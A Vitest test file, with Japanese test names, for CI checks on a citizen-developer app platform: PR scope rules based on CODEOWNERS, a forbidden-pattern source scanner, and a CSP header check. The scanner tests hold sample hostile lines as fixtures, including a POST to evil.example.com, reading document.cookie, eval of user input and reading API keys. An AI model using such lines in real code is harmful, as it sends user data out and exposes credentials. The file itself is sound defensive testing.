import { describe, expect, it } from 'vitest';
import { classifyChanges, judge, parseOwners } from './check-scope.mjs';
import { scanSource } from './check-safety.mjs';
import { toSwaConfig } from './manifests.mjs';

describe('④ 変更範囲チェック', () => {
  const owners = parseOwners('# 承認者\n* @jnxjent\n/tools/ @Midac-Holdings/ai-team\n');

  it('CODEOWNERS から個人の承認者を読む', () => {
    expect([...owners]).toEqual(['jnxjent']);
  });

  it('自分のアプリのフォルダと package-lock.json だけなら OK', () => {
    const r = judge({ files: ['apps/bm/meeting-room/src/App.tsx', 'apps/bm/meeting-room/app.manifest.json', 'package-lock.json'], author: 'citizen1', owners });
    expect(r).toMatchObject({ ok: true, apps: ['apps/bm/meeting-room'] });
  });

  it('ポータル・仕組み・テンプレートの変更は市民の PR では NG', () => {
    const r = judge({ files: ['apps/bm/meeting-room/src/App.tsx', '.github/workflows/ci-deploy.yml', 'apps/_template/src/App.tsx'], author: 'citizen1', owners });
    expect(r.ok).toBe(false);
    expect(r.restricted).toEqual(['.github/workflows/ci-deploy.yml', 'apps/_template/src/App.tsx']);
  });

  it('他人のアプリも同時に変更していたら NG', () => {
    const r = judge({ files: ['apps/bm/meeting-room/src/App.tsx', 'apps/bm/equipment/src/App.tsx'], author: 'citizen1', owners });
    expect(r.ok).toBe(false);
    expect(r.messages.join()).toContain('1つ');
  });

  it('管理者（CODEOWNERS）の PR なら仕組み側の変更も OK', () => {
    expect(judge({ files: ['tools/build.mjs', 'portal/src/App.tsx'], author: 'JNXJENT', owners }).ok).toBe(true);
  });

  it('apps 直下の部署フォルダ以外のファイルは管理者のみ', () => {
    expect(classifyChanges(['apps/README.md']).restricted).toEqual(['apps/README.md']);
  });
});

describe('⑤ 禁止パターンチェック', () => {
  const rules = (code) => scanSource(code).map((f) => f.rule);

  it.each([
    ["fetch('https://evil.example.com/collect', { method: 'POST' })", ['external-url', 'network']],
    ["await fetch('/api/data')", ['network']],
    ['<script src="https://cdn.example.com/x.js"></script>', ['external-url']],
    ['eval(userInput)', ['eval']],
    ["setTimeout('alert(1)', 10)", ['eval']],
    ['<div dangerouslySetInnerHTML={{ __html: text }} />', ['raw-html']],
    ['el.innerHTML = text', ['raw-html']],
    ['const c = document.cookie', ['cookie']],
    ["location.href = '/.auth/login/aad'", ['auth']],
    ['const key = import.meta.env.VITE_API_KEY', ['env']],
  ])('%s を検出する', (code, expected) => {
    expect(rules(code)).toEqual(expected);
  });

  it('通常のコード・コメント・開発モード判定は検出しない', () => {
    expect(rules("const [items, setItems] = useState<string[]>([]);\nlocalStorage.setItem('k', v);\nif (import.meta.env.DEV) {}\n// 参考: https://example.com\n<a href=\"/\">ポータルに戻る</a>")).toEqual([]);
  });

  it('行番号を返す', () => {
    expect(scanSource('ok\nok\neval(x)')[0].line).toBe(3);
  });
});

describe('⑥ ブラウザでの送信制限（CSP）', () => {
  it('自社サイト以外への送信・外部スクリプトを禁止する', () => {
    const csp = toSwaConfig([]).globalHeaders['Content-Security-Policy'];
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("script-src 'self'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).not.toMatch(/unsafe-eval/);
  });
});
